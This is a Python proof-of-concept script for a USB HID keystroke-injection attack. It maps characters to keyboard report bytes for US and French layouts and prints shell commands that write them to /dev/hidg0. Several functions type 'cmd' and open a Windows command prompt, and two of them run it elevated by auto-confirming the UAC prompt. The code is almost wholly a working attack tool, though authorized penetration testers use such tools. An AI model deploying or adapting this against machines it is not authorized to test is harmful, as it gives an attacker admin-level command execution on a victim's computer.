#!/usr/bin/python

# Formats payload to HID Keyboard sequences. Real rough poc for testing basic payloads.
dict_us = {
	# Symbols 
	"\x20": "\\x00\\x00\\x00\\x2c\\x00\\x00\\x00\\x00",
	"\x21": "\\x20\\x00\\x00\\x1e\\x00\\x00\\x00\\x00",
	"\x22": "\\x20\\x00\\x00\\x34\\x00\\x00\\x00\\x00",
	"\x23": "\\x20\\x00\\x00\\x20\\x00\\x00\\x00\\x00",
	"\x24": "\\x20\\x00\\x00\\x21\\x00\\x00\\x00\\x00",
	"\x25": "\\x20\\x00\\x00\\x22\\x00\\x00\\x00\\x00",
	"\x26": "\\x20\\x00\\x00\\x24\\x00\\x00\\x00\\x00",
	"\x27": "\\x00\\x00\\x00\\x34\\x00\\x00\\x00\\x00",
	"\x28": "\\x20\\x00\\x00\\x26\\x00\\x00\\x00\\x00",
	"\x29": "\\x20\\x00\\x00\\x27\\x00\\x00\\x00\\x00",
	"\x2a": "\\x20\\x00\\x00\\x25\\x00\\x00\\x00\\x00",
	"\x2b": "\\x20\\x00\\x00\\x2e\\x00\\x00\\x00\\x00",
	"\x2c": "\\x00\\x00\\x00\\x36\\x00\\x00\\x00\\x00",
	"\x2d": "\\x00\\x00\\x00\\x2d\\x00\\x00\\x00\\x00",
	"\x2e": "\\x00\\x00\\x00\\x37\\x00\\x00\\x00\\x00",
	"\x2f": "\\x00\\x00\\x00\\x38\\x00\\x00\\x00\\x00",
	# Numbers
	"\x30": "\\x00\\x00\\x00\\x27\\x00\\x00\\x00\\x00",
	"\x31": "\\x00\\x00\\x00\\x1e\\x00\\x00\\x00\\x00",
	"\x32": "\\x00\\x00\\x00\\x1f\\x00\\x00\\x00\\x00",
	"\x33": "\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00",
	"\x34": "\\x00\\x00\\x00\\x21\\x00\\x00\\x00\\x00",
	"\x35": "\\x00\\x00\\x00\\x22\\x00\\x00\\x00\\x00",
	"\x36": "\\x00\\x00\\x00\\x23\\x00\\x00\\x00\\x00",
	"\x37": "\\x00\\x00\\x00\\x24\\x00\\x00\\x00\\x00",
	"\x38": "\\x00\\x00\\x00\\x25\\x00\\x00\\x00\\x00",
	"\x39": "\\x00\\x00\\x00\\x26\\x00\\x00\\x00\\x00",
	# Symbols
	"\x3a": "\\x20\\x00\\x00\\x33\\x00\\x00\\x00\\x00",
	"\x3b": "\\x00\\x00\\x00\\x33\\x00\\x00\\x00\\x00",
	"\x3c": "\\x20\\x00\\x00\\x36\\x00\\x00\\x00\\x00",
	"\x3d": "\\x00\\x00\\x00\\x2e\\x00\\x00\\x00\\x00",
	"\x3e": "\\x20\\x00\\x00\\x37\\x00\\x00\\x00\\x00",
	"\x3f": "\\x20\\x00\\x00\\x38\\x00\\x00\\x00\\x00",
	"\x40": "\\x20\\x00\\x00\\x1f\\x00\\x00\\x00\\x00",
	# Uppercase
	"\x41": "\\x20\\x00\\x00\\x04\\x00\\x00\\x00\\x00",
	"\x42": "\\x20\\x00\\x00\\x05\\x00\\x00\\x00\\x00",
	"\x43": "\\x20\\x00\\x00\\x06\\x00\\x00\\x00\\x00",
	"\x44": "\\x20\\x00\\x00\\x07\\x00\\x00\\x00\\x00",
	"\x45": "\\x20\\x00\\x00\\x08\\x00\\x00\\x00\\x00",
	"\x46": "\\x20\\x00\\x00\\x09\\x00\\x00\\x00\\x00",
	"\x47": "\\x20\\x00\\x00\\x0a\\x00\\x00\\x00\\x00",
	"\x48": "\\x20\\x00\\x00\\x0b\\x00\\x00\\x00\\x00",
	"\x49": "\\x20\\x00\\x00\\x0c\\x00\\x00\\x00\\x00",
	"\x4a": "\\x20\\x00\\x00\\x0d\\x00\\x00\\x00\\x00",
	"\x4b": "\\x20\\x00\\x00\\x0e\\x00\\x00\\x00\\x00",
	"\x4c": "\\x20\\x00\\x00\\x0f\\x00\\x00\\x00\\x00",
	"\x4d": "\\x20\\x00\\x00\\x10\\x00\\x00\\x00\\x00",
	"\x4e": "\\x20\\x00\\x00\\x11\\x00\\x00\\x00\\x00",
	"\x4f": "\\x20\\x00\\x00\\x12\\x00\\x00\\x00\\x00",
	"\x50": "\\x20\\x00\\x00\\x13\\x00\\x00\\x00\\x00",
	"\x51": "\\x20\\x00\\x00\\x14\\x00\\x00\\x00\\x00",
	"\x52": "\\x20\\x00\\x00\\x15\\x00\\x00\\x00\\x00",
	"\x53": "\\x20\\x00\\x00\\x16\\x00\\x00\\x00\\x00",
	"\x54": "\\x20\\x00\\x00\\x17\\x00\\x00\\x00\\x00",
	"\x55": "\\x20\\x00\\x00\\x18\\x00\\x00\\x00\\x00",
	"\x56": "\\x20\\x00\\x00\\x19\\x00\\x00\\x00\\x00",
	"\x57": "\\x20\\x00\\x00\\x1a\\x00\\x00\\x00\\x00",
	"\x58": "\\x20\\x00\\x00\\x1b\\x00\\x00\\x00\\x00",
	"\x59": "\\x20\\x00\\x00\\x1c\\x00\\x00\\x00\\x00",
	"\x5a": "\\x20\\x00\\x00\\x1d\\x00\\x00\\x00\\x00",
	# Symbols
	"\x5b": "\\x00\\x00\\x00\\x2f\\x00\\x00\\x00\\x00",
	"\x5c": "\\x00\\x00\\x00\\x31\\x00\\x00\\x00\\x00",
	"\x5d": "\\x00\\x00\\x00\\x30\\x00\\x00\\x00\\x00",
	"\x5e": "\\x20\\x00\\x00\\x23\\x00\\x00\\x00\\x00",
	"\x5f": "\\x00\\x00\\x00\\x2d\\x00\\x00\\x00\\x00",
	"\x60": "\\x00\\x00\\x00\\x35\\x00\\x00\\x00\\x00",
	# Lowercase
	"\x61": "\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00",
	"\x62": "\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00",
	"\x63": "\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00",
	"\x64": "\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x00",
	"\x65": "\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00",
	"\x66": "\\x00\\x00\\x00\\x09\\x00\\x00\\x00\\x00",
	"\x67": "\\x00\\x00\\x00\\x0a\\x00\\x00\\x00\\x00",
	"\x68": "\\x00\\x00\\x00\\x0b\\x00\\x00\\x00\\x00",
	"\x69": "\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x00",
	"\x6a": "\\x00\\x00\\x00\\x0d\\x00\\x00\\x00\\x00",
	"\x6b": "\\x00\\x00\\x00\\x0e\\x00\\x00\\x00\\x00",
	"\x6c": "\\x00\\x00\\x00\\x0f\\x00\\x00\\x00\\x00",
	"\x6d": "\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00",
	"\x6e": "\\x00\\x00\\x00\\x11\\x00\\x00\\x00\\x00",
	"\x6f": "\\x00\\x00\\x00\\x12\\x00\\x00\\x00\\x00",
	"\x70": "\\x00\\x00\\x00\\x13\\x00\\x00\\x00\\x00",
	"\x71": "\\x00\\x00\\x00\\x14\\x00\\x00\\x00\\x00",
	"\x72": "\\x00\\x00\\x00\\x15\\x00\\x00\\x00\\x00",
	"\x73": "\\x00\\x00\\x00\\x16\\x00\\x00\\x00\\x00",
	"\x74": "\\x00\\x00\\x00\\x17\\x00\\x00\\x00\\x00",
	"\x75": "\\x00\\x00\\x00\\x18\\x00\\x00\\x00\\x00",
	"\x76": "\\x00\\x00\\x00\\x19\\x00\\x00\\x00\\x00",
	"\x77": "\\x00\\x00\\x00\\x1a\\x00\\x00\\x00\\x00",
	"\x78": "\\x00\\x00\\x00\\x1b\\x00\\x00\\x00\\x00",
	"\x79": "\\x00\\x00\\x00\\x1c\\x00\\x00\\x00\\x00",
	"\x7a": "\\x00\\x00\\x00\\x1d\\x00\\x00\\x00\\x00",
	#Shift chars
	"\x7b": "\\x20\\x00\\x00\\x2f\\x00\\x00\\x00\\x00",
	"\x7c": "\\x20\\x00\\x00\\x31\\x00\\x00\\x00\\x00",
	"\x7d": "\\x20\\x00\\x00\\x30\\x00\\x00\\x00\\x00",
	"\x7e": "\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00",
	#SDLK_RETURN,0x28
	"\x0a": "\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x00",
	"\x0d": "\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x00"
}
dict_fr = {
	"\x20": "\\x00\\x00\\x00\\x2c\\x00\\x00\\x00\\x00",
	"\x21": "\\x00\\x00\\x00\\x38\\x00\\x00\\x00\\x00",
	"\x22": "\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00",
	"\x23": "\\x05\\x00\\x00\\x20\\x00\\x00\\x00\\x00",
	"\x24": "\\x00\\x00\\x00\\x30\\x00\\x00\\x00\\x00",
	"\x25": "\\x20\\x00\\x00\\x34\\x00\\x00\\x00\\x00",
	"\x26": "\\x00\\x00\\x00\\x1e\\x00\\x00\\x00\\x00",
	"\x27": "\\x00\\x00\\x00\\x21\\x00\\x00\\x00\\x00",
	"\x28": "\\x00\\x00\\x00\\x22\\x00\\x00\\x00\\x00",
	"\x29": "\\x00\\x00\\x00\\x2d\\x00\\x00\\x00\\x00",
	"\x30": "\\x20\\x00\\x00\\x27\\x00\\x00\\x00\\x00",
	"\x31": "\\x20\\x00\\x00\\x1e\\x00\\x00\\x00\\x00",
	"\x32": "\\x20\\x00\\x00\\x1f\\x00\\x00\\x00\\x00",
	"\x33": "\\x20\\x00\\x00\\x20\\x00\\x00\\x00\\x00",
	"\x34": "\\x20\\x00\\x00\\x21\\x00\\x00\\x00\\x00",
	"\x35": "\\x20\\x00\\x00\\x22\\x00\\x00\\x00\\x00",
	"\x36": "\\x20\\x00\\x00\\x23\\x00\\x00\\x00\\x00",
	"\x37": "\\x20\\x00\\x00\\x24\\x00\\x00\\x00\\x00",
	"\x38": "\\x20\\x00\\x00\\x25\\x00\\x00\\x00\\x00",
	"\x39": "\\x20\\x00\\x00\\x26\\x00\\x00\\x00\\x00",
	"\x40": "\\x05\\x00\\x00\\x27\\x00\\x00\\x00\\x00",
	"\x41": "\\x20\\x00\\x00\\x14\\x00\\x00\\x00\\x00",
	"\x42": "\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00",
	"\x43": "\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00",
	"\x44": "\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x00",
	"\x45": "\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00",
	"\x46": "\\x00\\x00\\x00\\x09\\x00\\x00\\x00\\x00",
	"\x47": "\\x20\\x00\\x00\\x0a\\x00\\x00\\x00\\x00",
	"\x48": "\\x20\\x00\\x00\\x0b\\x00\\x00\\x00\\x00",
	"\x49": "\\x20\\x00\\x00\\x0c\\x00\\x00\\x00\\x00",
	"\x50": "\\x20\\x00\\x00\\x13\\x00\\x00\\x00\\x00",
	"\x51": "\\x20\\x00\\x00\\x04\\x00\\x00\\x00\\x00",
	"\x52": "\\x20\\x00\\x00\\x15\\x00\\x00\\x00\\x00",
	"\x53": "\\x20\\x00\\x00\\x16\\x00\\x00\\x00\\x00",
	"\x54": "\\x20\\x00\\x00\\x17\\x00\\x00\\x00\\x00",
	"\x55": "\\x20\\x00\\x00\\x18\\x00\\x00\\x00\\x00",
	"\x56": "\\x20\\x00\\x00\\x19\\x00\\x00\\x00\\x00",
	"\x57": "\\x20\\x00\\x00\\x1d\\x00\\x00\\x00\\x00",
	"\x58": "\\x20\\x00\\x00\\x1b\\x00\\x00\\x00\\x00",
	"\x59": "\\x20\\x00\\x00\\x1c\\x00\\x00\\x00\\x00",
	"\x60": "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00",  # Removed as it is a composition char that mangles the next one
	"\x61": "\\x00\\x00\\x00\\x14\\x00\\x00\\x00\\x00",
	"\x62": "\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00",
	"\x63": "\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00",
	"\x64": "\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x00",
	"\x65": "\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00",
	"\x66": "\\x00\\x00\\x00\\x09\\x00\\x00\\x00\\x00",
	"\x67": "\\x00\\x00\\x00\\x0a\\x00\\x00\\x00\\x00",
	"\x68": "\\x00\\x00\\x00\\x0b\\x00\\x00\\x00\\x00",
	"\x69": "\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x00",
	"\x70": "\\x00\\x00\\x00\\x13\\x00\\x00\\x00\\x00",
	"\x71": "\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00",
	"\x72": "\\x00\\x00\\x00\\x15\\x00\\x00\\x00\\x00",
	"\x73": "\\x00\\x00\\x00\\x16\\x00\\x00\\x00\\x00",
	"\x74": "\\x00\\x00\\x00\\x17\\x00\\x00\\x00\\x00",
	"\x75": "\\x00\\x00\\x00\\x18\\x00\\x00\\x00\\x00",
	"\x76": "\\x00\\x00\\x00\\x19\\x00\\x00\\x00\\x00",
	"\x77": "\\x00\\x00\\x00\\x1d\\x00\\x00\\x00\\x00",
	"\x78": "\\x00\\x00\\x00\\x1b\\x00\\x00\\x00\\x00",
	"\x79": "\\x00\\x00\\x00\\x1c\\x00\\x00\\x00\\x00",
	"\x2a": "\\x00\\x00\\x00\\x31\\x00\\x00\\x00\\x00",
	"\x2b": "\\x20\\x00\\x00\\x2e\\x00\\x00\\x00\\x00",
	"\x2c": "\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00",
	"\x2d": "\\x00\\x00\\x00\\x23\\x00\\x00\\x00\\x00",
	"\x2e": "\\x20\\x00\\x00\\x36\\x00\\x00\\x00\\x00",
	"\x2f": "\\x20\\x00\\x00\\x37\\x00\\x00\\x00\\x00",
	"\x3a": "\\x00\\x00\\x00\\x37\\x00\\x00\\x00\\x00",
	"\x3b": "\\x00\\x00\\x00\\x36\\x00\\x00\\x00\\x00",
	"\x3c": "\\x00\\x00\\x00\\x64\\x00\\x00\\x00\\x00",
	"\x3d": "\\x00\\x00\\x00\\x2e\\x00\\x00\\x00\\x00",
	"\x3e": "\\x20\\x00\\x00\\x64\\x00\\x00\\x00\\x00",
	"\x3f": "\\x20\\x00\\x00\\x10\\x00\\x00\\x00\\x00",
	"\x4a": "\\x20\\x00\\x00\\x0d\\x00\\x00\\x00\\x00",
	"\x4b": "\\x20\\x00\\x00\\x0e\\x00\\x00\\x00\\x00",
	"\x4c": "\\x20\\x00\\x00\\x0f\\x00\\x00\\x00\\x00",
	"\x4d": "\\x20\\x00\\x00\\x33\\x00\\x00\\x00\\x00",
	"\x4e": "\\x20\\x00\\x00\\x11\\x00\\x00\\x00\\x00",
	"\x4f": "\\x20\\x00\\x00\\x12\\x00\\x00\\x00\\x00",
	"\x5a": "\\x20\\x00\\x00\\x1a\\x00\\x00\\x00\\x00",
	"\x5b": "\\x05\\x00\\x00\\x22\\x00\\x00\\x00\\x00",
	"\x5c": "\\x05\\x00\\x00\\x25\\x00\\x00\\x00\\x00",
	"\x5d": "\\x05\\x00\\x00\\x2d\\x00\\x00\\x00\\x00",
	"\x5e": "\\x00\\x00\\x00\\x2f\\x00\\x00\\x00\\x00",
	"\x5f": "\\x00\\x00\\x00\\x25\\x00\\x00\\x00\\x00",
	"\x6a": "\\x00\\x00\\x00\\x0d\\x00\\x00\\x00\\x00",
	"\x6b": "\\x00\\x00\\x00\\x0e\\x00\\x00\\x00\\x00",
	"\x6c": "\\x00\\x00\\x00\\x0f\\x00\\x00\\x00\\x00",
	"\x6d": "\\x00\\x00\\x00\\x33\\x00\\x00\\x00\\x00",
	"\x6e": "\\x00\\x00\\x00\\x11\\x00\\x00\\x00\\x00",
	"\x6f": "\\x00\\x00\\x00\\x12\\x00\\x00\\x00\\x00",
	"\x7a": "\\x00\\x00\\x00\\x1a\\x00\\x00\\x00\\x00",
	"\x7b": "\\x05\\x00\\x00\\x21\\x00\\x00\\x00\\x00",
	"\x7c": "\\x05\\x00\\x00\\x23\\x00\\x00\\x00\\x00",
	"\x7d": "\\x05\\x00\\x00\\x2e\\x00\\x00\\x00\\x00",
	"\x7e": "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00",  # Removed as it is a composition char that mangles the next one
	#SDLK_RETURN,0x28
	"\x0a": "\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x00",
	"\x0d": "\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x00"
}
def findinlist(byte, locale):
	if locale=="us" : print '''echo -ne "''' +dict_us[byte]+ '''" > /dev/hidg0'''
	elif locale=="fr" : print '''echo -ne "''' +dict_fr[byte]+ '''" > /dev/hidg0'''
	#else: print "#crap, couldn't find ["+byte +"]. Perhaps try adding it to the list."
	print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''	
	
def wincmd(locale):
	print '''sleep 1'''
	print '''echo -ne "\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''sleep 1'''
	findinlist(str.encode("\x63"), locale) #c
	print '''sleep 1'''
	findinlist(str.encode("\x6d"), locale) #m
	print '''sleep 1'''
	findinlist(str.encode("\x64"), locale) #d
	print '''sleep 1'''
	print '''echo -ne "\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''echo -ne "\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''sleep 1'''
	print '''echo -ne "\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''sleep 3'''

def win7cmd_elevated(locale):
	print '''sleep 1'''
	print '''echo -ne "\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0''' #windows key
	print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''sleep 1'''
	findinlist("\x63", locale) #c
	print '''sleep 1'''
	findinlist("\x6d", locale) #m
	print '''sleep 1'''
	findinlist("\x64", locale) #d
	print '''sleep 1'''
	print '''echo --left-ctrl --left-shift --return | hid-keyboard /dev/hidg0 keyboard'''
	print '''sleep 1'''
	if locale=="us" : print '''echo --left-alt y | hid-keyboard /dev/hidg0 keyboard'''
	elif locale=="fr" : print '''echo --left-alt o | hid-keyboard /dev/hidg0 keyboard'''
	print '''sleep 3'''
	

def win8cmd_elevated(locale):
	print '''sleep 1'''
	print '''echo -ne "\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''sleep 1'''
	findinlist("\x63", locale) #c
	print '''sleep 1'''
	findinlist("\x6d", locale) #m
	print '''sleep 1'''
	findinlist("\x64", locale) #d
	print '''sleep 1'''
	print '''echo -ne "\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''sleep 1'''
	print '''echo -ne "\\x02\\x00\\x00\\x43\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''sleep 1'''
	print '''echo -ne "\\x01\\x00\\x00\\x51\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''sleep 1'''
	print '''echo -ne "\\x01\\x00\\x00\\x51\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''sleep 1'''
	print '''echo -ne "\\x01\\x00\\x00\\x51\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''sleep 1'''
	print '''echo -ne "\\x01\\x00\\x00\\x51\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''sleep 2'''
	print '''echo -ne "\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''sleep 2'''
	print '''echo -ne "\\x04\\x00\\x00\\x1c\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''sleep 3'''

def enterb():
	print '''sleep 2'''
	print '''echo -ne "\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x00" > /dev/hidg0'''
	print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''

#Unit tests
#def main():
#	win7cmd_elevated("fr")

#if __name__ == "__main__":
#    main()